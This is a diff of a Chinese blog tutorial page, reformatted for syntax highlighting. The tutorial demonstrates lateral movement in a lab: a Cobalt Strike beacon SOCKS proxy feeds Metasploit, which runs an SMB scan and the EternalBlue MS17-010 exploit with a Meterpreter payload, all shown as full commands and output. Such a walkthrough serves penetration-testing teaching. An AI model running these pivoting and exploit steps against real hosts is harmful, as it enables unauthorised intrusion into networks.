@@ -459,6 +459,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -483,13 +486,15 @@
 <h1 id="0x03-Metasploit-连接到-Socks-代理服务"><a href="#0x03-Metasploit-连接到-Socks-代理服务" class="headerlink" title="0x03 Metasploit 连接到 Socks 代理服务"></a>0x03 Metasploit 连接到 Socks 代理服务</h1><ul>
 <li>CS 中创建好代理后，在 Metasploit 中可以运行以下命令通过 beacon 的 Socks 代理进行通信</li>
 </ul>
-<pre><code>setg Proxies socks4:127.0.0.1:[port]
-setg ReverseAllowProxy true</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">setg Proxies socks4:127.0.0.1:[port]
+setg ReverseAllowProxy true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>如果感觉上面命令比较长，还可以在 <code>Proxy Pivots</code> 界面中点击 <code>Tunnel</code> 按钮查看命令。</p>
 <ul>
 <li>运行以下命令来停止</li>
 </ul>
-<pre><code>unsetg Proxies</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">unsetg Proxies<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>setg 命令和 unsetg 表示在 metasploit 中全局有效，不用在每次选择模块后再重新设置。</p>
 <h1 id="0x04-演示"><a href="#0x04-演示" class="headerlink" title="0x04 演示"></a>0x04 演示</h1><h2 id="1、环境说明"><a href="#1、环境说明" class="headerlink" title="1、环境说明"></a>1、环境说明</h2><blockquote>
 <p>攻击机 IP：192.168.175.200</p>
@@ -499,102 +504,112 @@ setg ReverseAllowProxy true</code></pre>
 <p>当前已经上线了一个 IP 为 192.168.175.130 主机，通过 ipconfig 发现，该主机也在 192.168.232.0/24 地址段内。</p>
 <p>但当前攻击机无法访问 232 的地址段，因此如果想对 232 段内的主机发起攻击，就可以采用将 192.168.175.130 作为跳板机访问的方式。</p>
 <h2 id="2、设置-socks-代理"><a href="#2、设置-socks-代理" class="headerlink" title="2、设置 socks 代理"></a>2、设置 socks 代理</h2><p>开启交互模式</p>
-<pre><code>sleep 0</code></pre>
-<pre><code class="powershell">beacon&gt; sleep 0
-[*] Tasked beacon to become interactive
-[+] host called home, sent: 16 bytes</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">sleep 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> <span class="token function">sleep</span> 0
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to become interactive
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 16 bytes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>开启 socks 代理</p>
-<pre><code>socks 9527</code></pre>
-<pre><code class="powershell">beacon&gt; socks 9527
-[+] started SOCKS4a server on: 9527
-[+] host called home, sent: 16 bytes</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">socks 9527<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> socks 9527
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> started SOCKS4a server on: 9527
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 16 bytes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>以上操作也可以通过图形化的方式进行。</p>
 <h2 id="3、Metasploit-中进行设置"><a href="#3、Metasploit-中进行设置" class="headerlink" title="3、Metasploit 中进行设置"></a>3、Metasploit 中进行设置</h2><p>开启 Metasploit 后，运行 setg 命令</p>
-<pre><code>setg Proxies socks4:192.168.175.200:9527</code></pre>
-<pre><code class="powershell">msf5 &gt; setg Proxies socks4:192.168.175.200:9527
-Proxies =&gt; socks4:192.168.175.200:9527</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">setg Proxies socks4:192.168.175.200:9527<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msf5 > setg Proxies socks4:192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200:9527
+Proxies => socks4:192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200:9527<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <h2 id="4、扫描-192-168-232-0-24-地址段中的-445-端口"><a href="#4、扫描-192-168-232-0-24-地址段中的-445-端口" class="headerlink" title="4、扫描 192.168.232.0/24 地址段中的 445 端口"></a>4、扫描 192.168.232.0/24 地址段中的 445 端口</h2><p>这里作为演示，只扫描一下 445 端口</p>
-<pre><code>use auxiliary/scanner/smb/smb_version
-set rhost 192.168.232.0/24
+<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version
+set rhost 192.168.232.0&#x2F;24
 set threads 64
-exploit</code></pre>
-<pre><code class="powershell">msf5 &gt; use auxiliary/scanner/smb/smb_version 
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-msf5 auxiliary(scanner/smb/smb_version) &gt; set rhost 192.168.232.0/24 
-rhost =&gt; 192.168.232.0/24
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msf5 > use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version 
 
-msf5 auxiliary(scanner/smb/smb_version) &gt; set threads 64
-threads =&gt; 64
+msf5 auxiliary<span class="token punctuation">(</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version<span class="token punctuation">)</span> > <span class="token function">set</span> rhost 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24 
+rhost => 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24
 
-msf5 auxiliary(scanner/smb/smb_version) &gt; exploit 
-use auxiliary/scanner/smb/smb_version
-[*] 192.168.232.0/24:445  - Scanned  44 of 256 hosts (17% complete)
-[*] 192.168.232.0/24:445  - Scanned  64 of 256 hosts (25% complete)
-[*] 192.168.232.0/24:445  - Scanned 110 of 256 hosts (42% complete)
-[*] 192.168.232.0/24:445  - Scanned 111 of 256 hosts (43% complete)
-[*] 192.168.232.0/24:445  - Scanned 128 of 256 hosts (50% complete)
-[+] 192.168.232.133:445   - Host is running Windows 7 Ultimate SP1 (build:7601) (name:WINTEST) (domain:TEAMSSIX) (signatures:optional)
-[+] 192.168.232.132:445   - Host is running Windows 2008 HPC SP1 (build:7601) (name:WINDC) (domain:TEAMSSIX) (signatures:required)
-[*] 192.168.232.0/24:445  - Scanned 165 of 256 hosts (64% complete)
-[*] 192.168.232.0/24:445  - Scanned 184 of 256 hosts (71% complete)
-[*] 192.168.232.0/24:445  - Scanned 220 of 256 hosts (85% complete)
-[*] 192.168.232.0/24:445  - Scanned 249 of 256 hosts (97% complete)
-[*] 192.168.232.0/24:445  - Scanned 256 of 256 hosts (100% complete)
-[*] Auxiliary module execution completed</code></pre>
+msf5 auxiliary<span class="token punctuation">(</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version<span class="token punctuation">)</span> > <span class="token function">set</span> threads 64
+threads => 64
+
+msf5 auxiliary<span class="token punctuation">(</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version<span class="token punctuation">)</span> > exploit 
+use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned  44 of 256 hosts <span class="token punctuation">(</span>17<span class="token operator">%</span> complete<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned  64 of 256 hosts <span class="token punctuation">(</span>25<span class="token operator">%</span> complete<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 110 of 256 hosts <span class="token punctuation">(</span>42<span class="token operator">%</span> complete<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 111 of 256 hosts <span class="token punctuation">(</span>43<span class="token operator">%</span> complete<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 128 of 256 hosts <span class="token punctuation">(</span>50<span class="token operator">%</span> complete<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>133:445   <span class="token operator">-</span> Host is running Windows 7 Ultimate SP1 <span class="token punctuation">(</span>build:7601<span class="token punctuation">)</span> <span class="token punctuation">(</span>name:WINTEST<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:TEAMSSIX<span class="token punctuation">)</span> <span class="token punctuation">(</span>signatures:optional<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445   <span class="token operator">-</span> Host is running Windows 2008 HPC SP1 <span class="token punctuation">(</span>build:7601<span class="token punctuation">)</span> <span class="token punctuation">(</span>name:WINDC<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:TEAMSSIX<span class="token punctuation">)</span> <span class="token punctuation">(</span>signatures:required<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 165 of 256 hosts <span class="token punctuation">(</span>64<span class="token operator">%</span> complete<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 184 of 256 hosts <span class="token punctuation">(</span>71<span class="token operator">%</span> complete<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 220 of 256 hosts <span class="token punctuation">(</span>85<span class="token operator">%</span> complete<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 249 of 256 hosts <span class="token punctuation">(</span>97<span class="token operator">%</span> complete<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 256 of 256 hosts <span class="token punctuation">(</span>100<span class="token operator">%</span> complete<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h2 id="5、发现利用"><a href="#5、发现利用" class="headerlink" title="5、发现利用"></a>5、发现利用</h2><p>通过扫描发现在 192.168.232.0/24 地址段内，除了已经上线的 <code>133</code> 主机外，还有 <code>132</code> 主机也开放了 445 端口，且该主机为 Windows 2008 的操作系统，这里使用永恒之蓝作为演示。</p>
-<pre><code>use exploit/windows/smb/ms17_010_eternalblue
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue
 set rhosts 192.168.232.132
-set payload windows/x64/meterpreter/bind_tcp
-exploit</code></pre>
-<pre><code class="powershell">msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue
+set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 192.168.232.132
-rhosts =&gt; 192.168.232.132
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msf5 > use exploit<span class="token operator">/</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_eternalblue
 
-msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/bind_tcp
-payload =&gt; windows/x64/meterpreter/bind_tcp
+msf5 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_eternalblue<span class="token punctuation">)</span> > <span class="token function">set</span> rhosts 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132
+rhosts => 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132
 
-msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit 
-[*] 192.168.232.132:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
-[+] 192.168.232.132:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 HPC Edition 7601 Service Pack 1 x64 (64-bit)
-[*] 192.168.232.132:445   - Scanned 1 of 1 hosts (100% complete)
-[*] 192.168.232.132:445 - Connecting to target for exploitation.
-[+] 192.168.232.132:445 - Connection established for exploitation.
-[+] 192.168.232.132:445 - Target OS selected valid for OS indicated by SMB reply
-[*] 192.168.232.132:445 - CORE raw buffer dump (51 bytes)
-[*] 192.168.232.132:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
-[*] 192.168.232.132:445 - 0x00000010  30 30 38 20 48 50 43 20 45 64 69 74 69 6f 6e 20  008 HPC Edition 
-[*] 192.168.232.132:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
-[*] 192.168.232.132:445 - 0x00000030  6b 20 31                                         k 1             
-[+] 192.168.232.132:445 - Target arch selected valid for arch indicated by DCE/RPC reply
-[*] 192.168.232.132:445 - Trying exploit with 12 Groom Allocations.
-[*] 192.168.232.132:445 - Sending all but last fragment of exploit packet
-[*] 192.168.232.132:445 - Starting non-paged pool grooming
-[+] 192.168.232.132:445 - Sending SMBv2 buffers
-[+] 192.168.232.132:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
-[*] 192.168.232.132:445 - Sending final SMBv2 buffers.
-[*] 192.168.232.132:445 - Sending last fragment of exploit packet!
-[*] 192.168.232.132:445 - Receiving response from exploit packet
-[+] 192.168.232.132:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
-[*] 192.168.232.132:445 - Sending egg to corrupted connection.
-[*] 192.168.232.132:445 - Triggering free of corrupted buffer.
-[*] Started bind TCP handler against 192.168.232.132:4444
-[*] Sending stage (201283 bytes) to 192.168.232.132
-[*] Meterpreter session 1 opened (0.0.0.0:0 -&gt; 192.168.175.200:9527) at 2020-09-01 22:13:57 -0400
-[+] 192.168.232.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-[+] 192.168.232.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-[+] 192.168.232.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+msf5 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_eternalblue<span class="token punctuation">)</span> > <span class="token function">set</span> payload windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcp
+payload => windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcp
 
-meterpreter &gt; ipconfig
+msf5 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_eternalblue<span class="token punctuation">)</span> > exploit 
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> <span class="token keyword">Using</span> auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_ms17_010 as check
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445   <span class="token operator">-</span> Host is likely VULNERABLE to MS17<span class="token operator">-</span>010<span class="token operator">!</span> <span class="token operator">-</span> Windows Server 2008 HPC Edition 7601 Service Pack 1 x64 <span class="token punctuation">(</span>64<span class="token operator">-</span>bit<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445   <span class="token operator">-</span> Scanned 1 of 1 hosts <span class="token punctuation">(</span>100<span class="token operator">%</span> complete<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Connecting to target <span class="token keyword">for</span> exploitation<span class="token punctuation">.</span>
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Connection established <span class="token keyword">for</span> exploitation<span class="token punctuation">.</span>
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Target OS selected valid <span class="token keyword">for</span> OS indicated by SMB reply
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> CORE raw buffer dump <span class="token punctuation">(</span>51 bytes<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> 0x00000010  30 30 38 20 48 50 43 20 45 64 69 74 69 6f 6e 20  008 HPC Edition 
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> 0x00000030  6b 20 31                                         k 1             
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Target arch selected valid <span class="token keyword">for</span> arch indicated by DCE<span class="token operator">/</span>RPC reply
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Trying exploit with 12 Groom Allocations<span class="token punctuation">.</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Sending all but last fragment of exploit packet
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Starting non<span class="token operator">-</span>paged pool grooming
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Sending SMBv2 buffers
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer<span class="token punctuation">.</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Sending final SMBv2 buffers<span class="token punctuation">.</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Sending last fragment of exploit packet<span class="token operator">!</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Receiving response <span class="token keyword">from</span> exploit packet
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> ETERNALBLUE overwrite completed successfully <span class="token punctuation">(</span>0xC000000D<span class="token punctuation">)</span><span class="token operator">!</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Sending egg to corrupted connection<span class="token punctuation">.</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Triggering free of corrupted buffer<span class="token punctuation">.</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started bind TCP handler against 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:4444
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span>201283 bytes<span class="token punctuation">)</span> to 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Meterpreter session 1 opened <span class="token punctuation">(</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:0 <span class="token operator">-</span>> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200:9527<span class="token punctuation">)</span> at 2020<span class="token operator">-</span>09<span class="token operator">-</span>01 22:13:57 <span class="token operator">-</span>0400
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> =<span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span>
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> =<span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-</span>WIN<span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span>
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> =<span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span>
+
+meterpreter > ipconfig
 Interface 11
 ============
-Name         : Intel(R) PRO/1000 MT Network Connection
+Name         : Intel<span class="token punctuation">(</span>R<span class="token punctuation">)</span> PRO<span class="token operator">/</span>1000 MT Network Connection
 Hardware MAC : 00:0c:29:d3:6c:3d
 MTU          : 1500
-IPv4 Address : 192.168.232.132
-IPv4 Netmask : 255.255.255.0
+IPv4 Address : 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132
+IPv4 Netmask : 255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>0
 IPv6 Address : fe80::a1ac:3035:cbdf:4872
-IPv6 Netmask : ffff:ffff:ffff:ffff::</code></pre>
+IPv6 Netmask : ffff:ffff:ffff:ffff::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <blockquote>
 <p>参考链接：</p>
 <p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p>
@@ -1028,7 +1043,7 @@ IPv6 Netmask : ffff:ffff:ffff:ffff::</code></pre>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
